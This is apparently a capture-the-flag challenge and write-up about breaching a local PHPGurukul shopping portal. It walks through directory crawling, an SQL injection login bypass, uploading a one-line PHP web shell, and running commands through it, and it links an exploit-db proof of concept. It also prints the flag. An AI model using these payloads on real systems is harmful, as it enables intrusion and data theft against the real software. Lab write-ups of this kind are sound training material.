## Shopping platform




**DESCRIPTION**

You work at a pentesting company and are tasked with testing a web store located at http://localhost:1012/shopping.


**QUESTION**

Breach the site and read the flag from /home/secret.txt

.
.
.
.
.
.
Made By v0lar
.
.
.
.
.
.
.
.
.
.
.**Writeup below**
.
.
.
.
.
.
.
.
.
.
.
.



(Manual)
1. Locate the admin page by using dirb or some other directory crawler. 'dirb http://localhost:1012/shopping'
2. Use SQL injection to gain access to admin -> username: `joke' or '1'='1'#` , password: `joke' or '1'='1'#`
3. Insert product section allows you to upload files. Upload "hax.php" that contains this line -> `<?php system($_GET["cmd"]); ?>`
4. Locate the file you uploaded by searching for that product -> http://localhost:1012/shopping/admin/productimages/23/hax.php
5. Add "?cmd=cat /home/secret.txt" to the end so the URL looks like this -> .../shopping/admin/productimages/26/hacks.php?cmd=cat /home/secret.txt
6. Press enter and you get the flag. flag -> iua87-UP9H-E7nE-P12n-Lo88-fHfm-71oh

(Automated)
1. Download exploit from -> https://www.exploit-db.com/exploits/47834
2. Run the exploit with -> python PoC.py 127.0.0.1:1012/shopping "cat /home/secret.txt"

flag -> iua87-UP9H-E7nE-P12n-Lo88-fHfm-71oh

Sopping portal - https://phpgurukul.com/shopping-portal-free-download/
